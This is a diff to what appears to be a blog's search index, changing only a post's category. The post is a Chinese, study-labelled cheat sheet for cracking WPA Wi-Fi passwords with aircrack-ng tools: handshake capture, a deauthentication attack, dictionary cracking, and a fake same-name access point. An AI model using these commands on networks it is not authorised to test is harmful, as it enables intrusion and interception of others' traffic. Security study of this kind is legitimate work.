@@ -104,7 +104,7 @@
     <url>%2FWi-Fi%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%2F</url>
     <content type="text"><![CDATA[仅供学习参考 总结 wifi密码破解将WLAN0网卡开启混杂模式 airmon-ng start wlan0 ##提示要杀掉一些进程 airmon-ng check kill airmon-ng start wlan0 1、查看附近Wi-Fi airodump-ng wlan0mon 2、进行握手包监听与获取 airodump-ng -c 通道值 —bssid wifi的mac值 -w cap文件名 wlan0 ##其中wlan0mon是启动混杂模式的网卡名 3、断网抓取握手包（另开一个窗口） aireplay-ng -0 20 -c 客户机mac值 -a wifi热点mac值 wlan0mon #-0 death模式 20为发送次数 4、跑包 aircrack-ng -w 字典 包名 关闭混杂模式 airmon-ng stop wlan0mon 启动网络 service network-manager start ——————————分割线——————————— 构造同名的虚假AP airbase-ng —essid wifi名 -c 6 -Z 4 wlan0mon -c 代表channel信道 -Z代表WPA2加密 -z代表WPA1加密 z后面的参数1～5分别表示WEP40、TKIP、WRAP、CCMP、WEP104]]></content>
       <categories>
-        <category>实战总结</category>
+        <category>无线学习</category>
       </categories>
       <tags>
         <tag>无线安全</tag>
